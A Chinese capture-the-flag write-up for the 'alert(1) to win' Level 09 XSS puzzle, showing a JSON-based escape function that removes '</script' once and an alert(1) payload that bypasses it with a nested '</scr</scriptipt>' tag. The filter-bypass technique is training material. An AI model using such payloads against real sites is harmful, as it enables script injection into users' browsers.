## [[alert(1) to win](https://alf.nu/alert1)] [[Level 09 - JSON 2](https://alf.nu/alert1)] [[解题报告](http://exp-blog.com/2019/08/04/pid-3900/)]

------

## 题目

```javascript
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```

------

## 解题报告

[Level 03 - JSON](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/alert/Level%2003%20-%20JSON) 的进阶版。

回顾下第 3 题的 payload 是 ：

```javascript
</script><script>alert(1);//
```

而这题对输入的字符串会做 **一次** 全局替换，把 `</script` 删掉，使得我们无法闭合标签。

但是因为替换只做一次，所以要绕过也不难，只需要把 `</script` 做一次嵌套即可，例如 `</scr</scriptipt>`，被全局替换后，留下的就是我们需要的闭合标签 `</script>` 。

因此这题可构造这样的 payload ：

```javascript
</scr</scriptipt><script>alert(1);//
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/alert/Level%2009%20-%20JSON%202/imgs/01.png)



------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
